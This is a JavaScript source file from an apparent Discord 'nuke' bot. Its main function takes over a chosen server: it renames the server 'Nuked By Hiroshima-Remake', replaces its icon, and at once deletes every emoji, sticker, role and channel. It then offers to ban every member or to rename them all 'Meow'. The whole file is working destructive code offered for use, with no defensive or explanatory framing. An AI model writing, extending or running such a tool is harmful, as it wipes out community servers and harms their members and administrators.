import readline from "readline"; // Import the readline module to handle user input from the command line
import { ChannelManager } from "./channel.js"; // Import the ChannelManager to handle channel deletions and creations
import { RoleManager } from "./role.js"; // Import the RoleManager to handle role deletions
import checkPermissions from "./checkPermission.js"; // Import a function to check the bot's permissions in the guild
import { client } from "../index.js"; // Import the client instance (bot) from the main entry point
import { selectedGuild } from "../alert/getGuild.js"; // Import the selected guild from the alert module
import EmojiManager from "./emoji.js"; // Import EmojiManager to handle emoji and sticker deletions
import pc from "picocolors"; // Import the picocolors library for colorful console output
import logger from "../logging/logger.js"; // Import the custom logger for logging actions
import MemberManager from "./member.js"; // Import MemberManager to handle member-related actions such as banning or changing nicknames
import { rl } from "../alert/getGuild.js";
// Function to initialize readline interface for user input

// Function to prompt the user with a question and return the answer
async function askQuestion(query, rl) {
  return new Promise((resolve) => {
    rl.question(query, (answer) => {
      const normalized = answer.toLowerCase();
      if (normalized === "y" || normalized === "n") {
        resolve(normalized); // Return the valid input
      } else {
        console.log(pc.red("Invalid input. Please enter 'y' or 'n'."));
        resolve(askQuestion(query, rl)); // Recursive call to re-prompt
      }
    });
  });
}

// Main nuke function to perform the server "nuking" actions
export default async function nuke() {
  const guild = await client.guilds.fetch(selectedGuild.id); // Fetch the selected guild using its ID
  const bot = await guild.members.fetch(client.user.id); // Fetch the bot (client) from the guild

  // Check if the bot has the necessary permissions to perform actions in the guild
  if (!(await checkPermissions(bot))) {
    console.log(pc.red(`press any key to exit.`));
    process.exit(1);
  }

  console.log(pc.green(`Nuking Server: ${guild.name}`)); // Log the server being nuked
  console.log(pc.yellow("Changing the server name...")); // Inform the user that the server name is being changed

  await logger.info("Changing the server name..."); // Log the action of changing the server name
  try {
    // Attempt to change the server name to "Nuked By Hiroshima-Remake"
    await guild.setName("Nuked By Hiroshima-Remake");
  } catch (error) {
    // If changing the name fails, log and print an error
    await logger.error("Failed to change the server name!");
    console.log(pc.red("Failed to change the server name!"));
  }

  console.log(pc.green("Server name changed successfully")); // Print success message after changing the name
  await logger.info("Server name changed successfully"); // Log the successful name change

  console.log(pc.yellow("Changing server icon...")); // Inform the user that the server icon is being changed
  await logger.info("Changing server icon..."); // Log the action of changing the server icon
  try {
    // Attempt to change the server icon to a specified image URL
    await guild.setIcon(
      "https://i.ibb.co/WN9MmvJs/the-kingth-of-kutet-thukuna.jpg"
    );
  } catch (error) {
    // If changing the icon fails, log and print an error
    await logger.error("Failed to change the server icon!");
    console.log(pc.red("Failed to change the server icon!"));
  }

  console.log(pc.green("Server icon changed successfully")); // Print success message after changing the icon
  await logger.info("Server icon changed successfully"); // Log the successful icon change

  // Perform the nuke actions concurrently: delete emojis, stickers, roles, and channels
  await Promise.all([
    EmojiManager.deleteEveryEmoji(guild),
    EmojiManager.deleteEverySticker(guild),
    RoleManager.deleteEveryRole(guild),
    ChannelManager.deleteEveryChannel(guild),
  ]);

  await logger.info("asking to ban everyone"); // Log the action of asking the user if they want to ban everyone
  const answer = await askQuestion(
    pc.yellow("Do you want to ban everyone from the server? (y/n): "), // Ask the user if they want to ban all members
    rl
  );

  if (answer.toLowerCase().startsWith("y")) {
    // If the user answers "yes", log and perform the action to ban everyone
    await logger.info("user wants to ban everyone");
    await MemberManager.banEveryone(guild);
  } else {
    // If the user answers "no", log and ask if they want to change everyone's nickname
    await logger.info("user doesn't want to ban everyone");
    await logger.info(
      "asking if they want to change everyone's server nickname"
    );
    const nicknameAnswer = await askQuestion(
      pc.yellow(
        'Do you want to change everyone\'s SERVER nickname to "Meow"? (y/n), NOT RECOMMENDED: ' // Ask if they want to change everyone's nickname
      ),
      rl
    );
    if (nicknameAnswer.toLowerCase().startsWith("y")) {
      // If the user agrees, log and change everyone's nickname to "Meow"
      await logger.info("user wants to change everyone's nickname to meow");
      await MemberManager.changeNickname(guild);
    }
  }

  rl.close(); // Close the readline interface after user input

  // Create a new channel as part of the nuke process
  await ChannelManager.createChannel(guild);

  console.clear(); // Clear the console screen for a clean output

  await logger.info("nuke finished!"); // Log that the nuke process is complete
  console.log(
    pc.cyan(
      "nuke finished, thanks for using this bot. \npress any key to exit." // Inform the user that the nuke process is finished
    )
  );
  process.exit(0); // Exit the process after the nuke is finished
}
